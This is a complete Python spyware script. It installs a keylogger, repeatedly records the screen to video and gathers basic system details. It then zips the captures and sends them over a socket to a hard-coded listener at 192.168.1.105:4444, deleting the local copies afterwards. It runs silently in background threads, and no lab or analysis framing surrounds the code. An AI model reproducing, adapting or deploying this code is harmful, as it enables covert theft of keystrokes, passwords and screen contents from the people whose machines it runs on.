ser_add = "192.168.1.105"
ser_port = 4444

            #modules needed
import os
import platform as plat
from tkinter.ttk import Separator
from pynput import keyboard
import numpy as np
import cv2
import pyautogui
import threading
import shutil
import socket
import tqdm

            #functions
def keyboard_monitoring():
    #collect events (pressed keys)
    with keyboard.Listener(on_press=savekey) as listener:
        listener.join()

def record():
    while True:
        screen_size = tuple(pyautogui.size())
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        fps = 12
        video_file = "C:/Docs/vid.avi"
        out = cv2.VideoWriter(video_file, fourcc, fps, screen_size)
        time2rec = 20 
        for i in range(int(time2rec * fps)):
            img = pyautogui.screenshot()
            # convert these pixels to a proper numpy array to work with OpenCV
            frame = np.array(img)
            # convert colors from BGR to RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            # write the frame
            out.write(frame)
        cv2.destroyAllWindows()
        out.release()
        shutil.make_archive("D:/Docs_z", 'zip', "C:/Docs")
        keys_file = open("C:/Docs/keys.txt", "w").close()
        os.remove("C:/Docs/vid.avi")
        send_Docs()
        os.remove("D:/Docs_z.zip")

def savekey(key):
    keys_file = open("C:/Docs/keys.txt", "a")
    keys_file.write(str(key)+"\n")
    keys_file.close()

def send_Docs():
    filename = "D:/Docs_z.zip"
    filesize = os.path.getsize(filename)
    buffer_size = 4096
    my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_sock.connect((ser_add, ser_port))     
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(buffer_size)
            if not bytes_read:
                # file transmitting is done
                break
            my_sock.sendall(bytes_read)
            progress.update(len(bytes_read))
    my_sock.close()

            #1-Docs & info-gath
#check if Docs exist if it doesn't creates it
Docs_exist = os.path.isdir("C:/Docs")
if Docs_exist == False:
    os.mkdir("C:/Docs")
#clear the content of keys.txt or create it if it doesn't exist 
keys_file = open("C:/Docs/keys.txt", "w").close()
#gather infos about the machine and append them to keys.txt
os_info = "OS name: "+str(plat.system())+"   OS version: "+str(plat.release())+"  architecture: "+str(plat.architecture())
keys_file = open("C:/Docs/keys.txt", "a")
keys_file.write(os_info+"\n\n")
keys_file.close()

            #2-start monitoring
thread1 = threading.Thread(target=keyboard_monitoring)
thread2 = threading.Thread(target=record)
thread1.start()
thread2.start()
